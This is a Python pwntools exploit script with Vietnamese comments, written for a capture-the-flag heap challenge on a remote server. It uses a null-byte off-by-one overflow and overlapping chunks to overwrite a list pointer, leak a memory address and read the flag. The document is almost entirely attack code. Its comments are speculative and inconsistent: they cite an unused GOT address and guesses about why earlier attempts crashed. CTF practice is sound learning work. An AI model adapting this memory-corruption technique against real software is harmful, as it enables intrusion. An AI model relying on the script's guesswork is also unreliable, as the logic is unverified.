from pwn import *

context.arch = 'amd64'

# --- Các hàm tiện ích sao chép từ lời giải mẫu, sửa lại cho đúng ---
def add(r, age, payload, line=True):
    r.sendlineafter(b"choice:", b"1")
    r.sendlineafter(b"age:", str(age).encode())
    # fgets cần một ký tự xuống dòng để kết thúc.
    # Lời giải gốc có thể đã xử lý việc này ở một nơi khác.
    # Chúng ta sẽ gửi nó một cách rõ ràng.
    if not line:
        r.sendafter(b"name:", payload)
        r.sendline(b'') # Gửi newline riêng
    else:
        r.sendline(payload) # sendline tự thêm newline

def view(r, i):
    r.sendlineafter(b"choice:", b"2")
    r.sendlineafter(b"person:", str(i).encode())
    r.sendlineafter(b"choice:", b"2")
    r.recvuntil(b"Their name is ")
    return r.recvline()

# --- Chương trình chính ---
r = remote('challs.watctf.org', 5151)

# Địa chỉ của con trỏ FLAG từ GDB của bạn
flag_ptr_addr = 0x49d430
# Địa chỉ mục tiêu mà chúng ta muốn person_at_index() trả về
target_addr = flag_ptr_addr - 8 

# Vấn đề: p64(target_addr) chứa null byte, fgets sẽ dừng lại.
# Lời giải của họ dùng một địa chỉ không có null byte.
# Chúng ta sẽ làm tương tự, nhưng với một mục tiêu khác: GOT entry của một hàm, ví dụ puts
puts_got = 0x404018
# p64(puts_got) cũng chứa null byte.

# Vậy thì, logic của lời giải gốc phải dựa vào một chi tiết khác.
# Có thể là phiên bản libc trên server của họ khác, và `fgets` không dừng ở null byte.
# Hoặc payload của họ đã được chế tạo để không chứa null byte.

# Hãy thử nghiệm một ý tưởng cuối cùng, dựa trên tất cả những gì đã thất bại.
# Lỗi off-by-one UAF 3 người là đúng về mặt lý thuyết nhất.
# Lý do nó thất bại là vì chương trình đã crash. Tại sao nó crash?
# Có thể là do con trỏ bị hỏng trỏ đến một vùng nhớ không thể đọc/ghi.

# Script 3 người cuối cùng của bạn đã thất bại với EOFError.
# Hãy thử lại nó một lần cuối cùng, với sự cẩn trọng tối đa.
log.info("Creating 3 persons for the overlapping chunk attack")
add(r, 1, b'P1') # index 2
add(r, 2, b'P2') # index 1
add(r, 3, b'P3') # index 0

log.info("Triggering null-byte overflow on P3->next to point into P2")
r.sendlineafter(b'choice: ', b'3')
r.sendlineafter(b'person: ', b'0') # Cập nhật P3
r.sendlineafter(b'choice: ', b'2')
add(r, 0, b'A'*24, line=False) # Gửi 24 byte và newline riêng

# Giai đoạn A
payload_leak = p64(flag_ptr_addr)
log.info(f"STAGE A: Overwriting P2->next with FLAG_PTR @ {hex(flag_ptr_addr)}")
r.sendlineafter(b'choice: ', b'3')
r.sendlineafter(b'person: ', b'1') # Truy cập P3->next (vào P2) để ghi vào P2->next
r.sendlineafter(b'choice: ', b'2')
r.sendline(payload_leak)

log.info("Leaking flag string address by viewing 'AGE' at index 2")
r.sendlineafter(b'choice: ', b'2')
r.sendlineafter(b'person: ', b'2')
r.sendlineafter(b'choice: ', b'1')

r.recvuntil(b'age is ')
line = r.recvline()
if line.strip().isdigit():
    flag_string_addr = int(line.strip())
    log.success(f"Leaked Address: {hex(flag_string_addr)}")

    # Giai đoạn B
    target_for_read = flag_string_addr - 8
    payload_read = p64(target_for_read)
    r.sendlineafter(b'choice: ', b'3')
    r.sendlineafter(b'person: ', b'1')
    r.sendlineafter(b'choice: ', b'2')
    r.sendline(payload_read)
    
    # Đọc flag
    r.sendlineafter(b'choice: ', b'2')
    r.sendlineafter(b'person: ', b'2')
    r.sendlineafter(b'choice: ', b'2')
    r.recvuntil(b'name is ')
    flag = r.recvline().strip()
    log.success(f'Flag: {flag}')
else:
    log.error("Leak failed. Received non-numeric data.")

r.close()